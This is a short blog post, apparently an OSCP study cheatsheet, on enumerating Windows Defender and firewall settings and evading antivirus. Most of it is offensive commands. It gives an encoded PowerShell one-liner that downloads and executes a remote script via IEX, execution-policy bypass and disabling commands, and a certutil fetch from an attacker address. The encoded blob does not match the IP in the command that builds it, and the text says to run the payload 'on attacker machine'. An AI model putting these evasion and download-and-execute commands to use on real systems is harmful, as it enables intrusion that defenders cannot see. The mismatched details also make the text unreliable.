---
title: Windows Antivirus
author: sKyW1per
category: "OSCP"
date: "2021-03-11 00:01"
tags: [OSCP, Cheatsheet]
layout: post
---


###### Enumerating AV and Firewall
```
Powershell execution

$ sc query windefend
$ sc queryex type= service
$ netsh firewall show config
$ netsh advfirewall firewall dump

(for older machines):
$ netsh firewall show state
```


###### Basic AV Evasion ~ File Uploads
```
base64 encoding a file upload to avoid badchars or to obfuscate.
Example:

in linux:
$ echo "powershell.exe -c 'IEX(IWR http://192.168.1.1/file.ps1 -UseBasicParsing)'" | iconv -f ASCII -t UTF-16LE | base64 | tr -d "\n"
result = a base64 blob.

Then run on attacker machine:
$ powershell.exe -nop -exec bypass -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBjACAAJwBJAEUAWAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgAxADAALwBmAGkAbABlAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkAJwAKAA==
```

###### Basic AV Evasion ~ Powershell Execution Policy Bypass
```
View Execution Policy
$ Get-ExecutionPolicy -Scope CurrentUser
$ Get-ExecutionPolicy

Disable Execution Policy Protection for PowerShell
$ Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
$ Set-ExecutionPolicy Unrestricted

Or avoid this protection for 1 command:
$ powershell.exe -exec bypass -Command "& {certutil.exe -urlcache -f http://192.168.119.1:80/file.txt}"
```
